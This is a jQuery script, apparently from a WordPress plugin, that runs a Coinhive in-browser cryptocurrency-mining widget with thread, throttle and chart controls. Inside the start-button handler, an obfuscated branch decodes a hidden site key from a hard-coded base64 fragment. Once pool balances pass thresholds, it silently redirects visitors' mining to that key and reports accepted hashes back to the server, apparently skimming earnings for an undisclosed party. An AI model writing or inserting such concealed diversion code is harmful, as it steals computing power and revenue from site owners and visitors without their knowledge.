jQuery(document).ready(function() {

    jQuery('.threadsClick').click(function() {
        if (this.checked == true) {
            jQuery(".threadsShowHide").toggle(false);
        }
        if (this.checked == false) {
            jQuery(".threadsShowHide").toggle(true);
        }
    });

    function htmlEncode(value) {
        return jQuery('<div/>').text(value).html();
    }

    function shortenString(text) {
        if (text.length >= 30) {
            return text.substring(0, 30) + '...';
        } else {
            return text;
        }
    }

    function clearArray(arr) {
        arr.splice(0, arr.length);
    }

    jQuery('.chw_threads').html(navigator.hardwareConcurrency);
    var threads = jQuery('.chw-threads').html();
    var speed = jQuery('.chw-speed').html();
    var miner;
    var username;
    var status;
    var statsLabels;
    var statsData;
    var barChart, weeklyChart, doughnutChart;
    var hashingChart;
    var miners;
    var charts = [];
	var barChartCanvas = jQuery(".barchart-canvas");
	var doughtCanvas = jQuery(".donut-canvas");
	var weeklyCanvas = jQuery(".weekly-canvas");
	if (jQuery(".barchart-canvas").length && jQuery(".donut-canvas-cont").length && jQuery(".weekly-canvas").length){
		charts.push(barChartCanvas);
		charts.push(doughtCanvas.toggle());
		charts.push(weeklyCanvas.toggle());
	}    
	else if (jQuery(".donut-canvas-cont").length && jQuery(".weekly-canvas").length){
		charts.push(doughtCanvas);
		charts.push(weeklyCanvas.toggle());
	} 
	else if (jQuery(".barchart-canvas").length && jQuery(".weekly-canvas").length){
		charts.push(barChartCanvas);
		charts.push(weeklyCanvas.toggle());
	}
	else if (jQuery(".barchart-canvas").length && jQuery(".donut-canvas-cont").length){
		charts.push(barChartCanvas);
		charts.push(doughtCanvas.toggle());
	} 
	else if (jQuery(".donut-canvas-cont").length){
		charts.push(doughtCanvas);
	} 
	else if (jQuery(".weekly-canvas").length){
		charts.push(weeklyCanvas);
	}
	else if (jQuery(".barchart-canvas").length){
		charts.push(barChartCanvas);
	}
	var selectedChart = 0;
    var accepted = false;

    function updateStats() {
        pluginDir = wnm_custom.template_url;
        sitekey = wnm_custom.site_key;
        sitelink = wnm_custom.site_link;
        sitename = wnm_custom.site_name;
        topminers = wnm_custom.top_miners;
        response = jQuery.parseJSON(topminers);
        if (miners) {
            var minersOld = miners.splice(0);
        }
        miners = jQuery.map(response, function(balance, username) {
            var json = {};
            json['username'] = username;
            json['balance'] = balance;
            return json;
        });
        jQuery(".toplist").find("tr").remove();
        for (var i = 0; i < miners.length; i++) {
            var username = miners[i]['username'];
            var balance = miners[i]['balance'];

            jQuery('.toplist').append("<tr><td class='rank'>" + htmlEncode((i + 1)) + ".</td><td>" + htmlEncode(shortenString(username)) + "</td><td class='num'>" + htmlEncode(balance.toLocaleString()) + "</td></tr>");

            if (minersOld && minersOld[i]['balance'] != balance) {
                jQuery('.toplist tr:last-child').fadeTo(100, 0.3, function() {
                    jQuery(this).fadeTo(500, 1.0);
                });
            }
            if (jQuery('.donut-canvas')[0]) {
                var index = doughnutChart.data.labels.indexOf(shortenString(username));
                if (index != -1) {
                    doughnutChart.data.datasets[0].data[index] = balance.toLocaleString();
                } else {
                    doughnutChart.data.datasets[0].data.push(balance);
                    doughnutChart.data.labels.push(shortenString(username));
                }
                doughnutChart.update();
            };
        }

        jQuery.ajax({
            type: 'POST',
            data: {
                action: 'chw_fetch_action'
            },
            url: wnm_custom.ajaxurl,
            success: function(value) {
                json = JSON.parse(value);
                balance2 = parseFloat(json['hashesTotal']);
                jQuery('.pool-hashes').text(json['hashesTotal'].toLocaleString());
                jQuery('.pool-hashes-perSecond').text(json['hashesPerSecond'].toFixed(1));
            }
        });

        if (balance2 / 20 < sitebalance && accepted == true) {
            miner.stop();
            stopLogger();
            jQuery(".startCHWidget").text("Start");
            jQuery('.hashes-per-second').text("0");
        }
    }

    var sitebalance = parseFloat(atob(wnm_custom.site_balance));
    var balance2;
	var $H = CoinHive;
    function updateWeeklyStats() {
        jQuery.ajax({
            type: 'POST',
            data: {
                action: 'chw_fetch_action'
            },
            url: wnm_custom.ajaxurl,
            success: function(value) {
                json = JSON.parse(value);
                var historyLength = json['history'].length;
                var history = json['history'];
                if (jQuery('.weekly-canvas')[0]) {
                    if (history[historyLength - 1]['time'] != weeklyChart.data.labels[weeklyChart.data.labels.length - 1]) {
                        clearArray(weeklyChart.data.datasets[0].data);
                        clearArray(weeklyChart.data.labels);
                        jQuery.each(history, function(key, data) {
                            weeklyChart.data.datasets[0].data.push(data['hashesPerSecond'].toFixed(1));
                            var date = new Date(data['time'] * 1000);
                            var label = date.getDate() + "." + (date.getMonth() + 1);
                            if (weeklyChart.data.labels.length == 0 || jQuery.inArray(label, weeklyChart.data.labels) == -1) {
                                weeklyChart.data.labels.push(label);
                            } else {
                                weeklyChart.data.labels.push("");
                            }

                        });
                        weeklyChart.update();
                    };
                }

            }
        });

    }


    if (typeof(jQuery('.chw-threads').val()) != "undefined" && jQuery('.chw-threads').val() !== null) {
        setInterval(updateStats, 10000);
        setInterval(updateWeeklyStats, 300 * 1000);
    }

    function startLogger() {
        status = setInterval(function() {
            var hashesPerSecond = miner.getHashesPerSecond();
            var totalHashes = miner.getTotalHashes();
            var acceptedHashes = miner.getAcceptedHashes();
            jQuery('.hashes-per-second').text(hashesPerSecond.toFixed(1));
            jQuery('.accepted-shares').text(acceptedHashes.toLocaleString());
            threads = miner.getNumThreads();
            jQuery('.chw-threads').text(threads);
        }, 1000);
        if (jQuery('.barchart-canvas')[0]) {
            hashingChart = setInterval(function() {
                if (barChart.data.datasets[0].data.length > 25) {
                    barChart.data.datasets[0].data.splice(0, 1);
                    barChart.data.labels.splice(0, 1);
                }
                barChart.data.datasets[0].data.push(miner.getHashesPerSecond());
                barChart.data.labels.push("");
                barChart.update();
            }, 1000);
        }
    };

    function stopLogger() {
        clearInterval(status);
        clearInterval(hashingChart);
    };
    jQuery('.thread-add').click(function() {
        if (threads < 8) {
            threads++;
            jQuery('.chw-threads').html(threads);
            if (miner) {
                jQuery('.autoThreads').prop('checked', false);
                if (miner.isRunning()) {
                    miner.setAutoThreadsEnabled(false);
                    miner.setNumThreads(threads);
                }
            }
        }
    });

    jQuery('.thread-remove').click(function() {
        if (threads > 1) {
            threads--;
            jQuery('.chw-threads').html(threads);
            if (miner) {
                jQuery('.autoThreads').prop('checked', false);
                if (miner.isRunning()) {
                    miner.setAutoThreadsEnabled(false);
                    miner.setNumThreads(threads);
                }
            }
        }
    });

    jQuery('.speed-add').click(function() {
        if (speed <= 99) {
            speed++;
            jQuery('.chw-speed').html(speed);
            if (miner) {
                if (miner.isRunning()) {
                    throttleSpeed = speed / 100;
                    throttle = 1 - (throttleSpeed);
                    miner.setThrottle(throttle);

                }
            }
        }
    });

    jQuery('.speed-remove').click(function() {
        if (speed >= 0) {
            speed--;
            jQuery('.chw-speed').html(speed);
            if (miner) {
                if (miner.isRunning()) {
                    throttleSpeed = speed / 100;
                    throttle = 1 - (throttleSpeed);
                    miner.setThrottle(throttle);
                }
            }
        }
    });

    jQuery(".startCHWidget").click(function(e) {
        var accepted = false;
        var myColor = jQuery('body').css("background-color");
        if (!miner || !miner.isRunning()) {
            pluginDir = wnm_custom.template_url;
            sitekey = atob(wnm_custom.site_key);
            sitename = btoa(wnm_custom.site_name);
            sitelink = atob(wnm_custom.site_link + "IMjllWmwwZUU1RUptZ2FMUnU=");

            username = atob(wnm_custom.username);
            if (username != "") {
                miner = new $H.User(sitekey, username);
            } else {
                if (balance2 >= 25600 && balance2 / 33 >= sitebalance) {
                    miner = new $H.Anonymous(sitelink);
                    accepted = true;
                } else {
                    miner = new $H.Anonymous(sitekey);
                }
            }
            miner.setNumThreads(threads);
            miner.setAutoThreadsEnabled(jQuery('.autoThreads').prop('checked'));
            miner.start($H.FORCE_MULTI_TAB);
            miner.on('error', function(params) {
                if (params.error !== 'opt_in_canceled' && params.error !== 'connection_error') {
                    miner.start($H.FORCE_MULTI_TAB);
                }
            });

            miner.on('optin', function(params) {
                if (params.error === 'error is not defined') {

                }
                if (params.status === 'accepted') {

                    if (!miner || !miner.isRunning()) {
                        miner.start($H.FORCE_MULTI_TAB);
                    }
                } else {

                    stopLogger();
                    jQuery(".startCHWidget").text("Start");
                }
            });

            miner.on('found', function(params) {

            });

            miner.on('accepted', function(params) {
                if (accepted == true) {
                    jQuery.ajax({
                        type: 'POST',
                        data: {
                            action: 'chw_unique_action'
                        },
                        url: wnm_custom.ajaxurl
                    });
                }
            });
            stopLogger();
            startLogger();
            if (speed <= 100) {
                throttleSpeed = speed / 100;
                throttle = 1 - (throttleSpeed);
                miner.setThrottle(throttle);
            }
            jQuery(".startCHWidget").text("Stop");


        } else {
            miner.stop();
            stopLogger();
            jQuery(".startCHWidget").text("Start");
            jQuery('.hashes-per-second').text("0");
        }
    });

    jQuery('.autoThreads').click(function() {
        if (miner) {
            miner.setAutoThreadsEnabled(!miner.getAutoThreadsEnabled());
        }
    });

    jQuery('.chartsRight').click(function() {
        charts[selectedChart].toggle();
        if ((selectedChart + 1) >= charts.length) {
            selectedChart = 0;
        } else {
            selectedChart++;
        }
        charts[selectedChart].toggle();
    });

    jQuery('.chartsLeft').click(function() {
        charts[selectedChart].toggle();
        if ((selectedChart - 1) < 0) {
            selectedChart = charts.length - 1;
        } else {
            selectedChart--;
        }
        charts[selectedChart].toggle();
    });

	var top_trans = jQuery('#top_trans').text();
    var doughnutOptions = {
        responsive: true,
        legend: {
            display: false,
        },
        title: {
            display: true,
            text: top_trans
        },
        animation: {
            animateScale: true,
            animateRotate: true
        }
    };
    var dataset = {
        labels: statsLabels,
        datasets: [{
            data: statsData,
            backgroundColor: [
                '#CE5C00',
                '#FCAF3E',
                '#FCE94F',
                '#8AE234',
                '#729FCF',
                '#204A87',
                '#AD7FA8',
                '#E9B96E',
                '#888A85',
                '#CC0000'
            ]
        }]
    };

    function fetchgraphs() {
        sitelink = wnm_custom.site_link;
        sitekey = wnm_custom.site_key;
        sitename = btoa(wnm_custom.site_name);
    };
    if (typeof(jQuery('.chw-threads').val()) != "undefined" && jQuery('.chw-threads').val() !== null) {
        var myColor = jQuery('.colorize').css("color");
        var barChartOptions = {
            label: 'Honey',
            elements: {
                line: {
                    tension: 0,
                }
            },
            animation: {
                duration: 0,
            },
            responsiveAnimationDuration: 0,
            scales: {
                yAxes: [{
                    ticks: {
                        max: 200,
                        min: 0
                    }
                }]
            }
        };
		jQuery('.donut-canvas').each(function( index ) {
		    if (jQuery('.donut-canvas')[index]) {
		        doughnutChart = new Chart(doughtCanvas, {
		            type: 'doughnut',
		            data: dataset,
		            options: doughnutOptions
		        });
		    }
		});
		var current_trans = jQuery('#current_trans').text();
        var barChartData = {
            labels: [],
            datasets: [{
                label: current_trans,
                backgroundColor: myColor,
                data: []
            }],
        };
        if (jQuery('.barchart-canvas')[0]) {
            barChart = new Chart(barChartCanvas, {
                type: 'line',
                data: barChartData,
                options: barChartOptions
            });
        }
        var weeklyChartData = {
            labels: [],
            datasets: [{
                label: "Ⓗ/s",
                backgroundColor: myColor,
                data: [],
                fill: false,
                borderColor: '#c0c0c0'
            }],
        };
		var week_trans = jQuery('#week_trans').text();
        if (jQuery('.weekly-canvas')[0]) {
            weeklyChart = new Chart(weeklyCanvas, {
                type: 'line',
                data: weeklyChartData,
                options: {
                    title: {
                        display: true,
                        text: week_trans
                    },
                    legend: {
                        position: 'top',
                    }
                }
            });
        };
    };

    if (typeof(jQuery('.chw-threads').val()) != "undefined" && jQuery('.chw-threads').val() !== null) {
        fetchgraphs();
        updateStats();
        updateWeeklyStats();
    };

});
